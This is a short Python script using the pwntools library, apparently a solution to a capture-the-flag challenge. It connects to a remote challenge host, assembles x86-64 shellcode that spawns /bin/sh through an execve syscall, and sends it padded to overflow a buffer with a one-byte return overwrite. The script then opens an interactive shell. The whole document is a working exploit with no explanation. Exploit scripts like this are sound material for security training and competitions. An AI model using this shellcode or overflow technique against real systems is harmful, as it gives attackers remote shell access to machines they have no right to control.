from multiprocessing import context
from pwn import * 
from LibcSearcher import * 
context.log_level = 'debug' 
# p=process('./pwn')

p=remote('t.ctf.qwq.cc',49468)
pause()
elf=ELF('./pwn')
context.arch ='amd64'
context.bits=64

shellcode=asm('push 0x68;mov rax ,0x68732f6e69622f;push rax;mov rdi,rsp;xor rsi, rsi;xor rdx, rdx;xor rax,rax;add rax,0x3b;syscall')
p.recvuntil(b'Do u know what\'s is it?\n')
payload=shellcode.ljust(0x38,b'a')+b'\x2a'
# payload=b'a'*0x30#+p64(0x7ffdadf3ddf0)
p.send(payload)
p.interactive()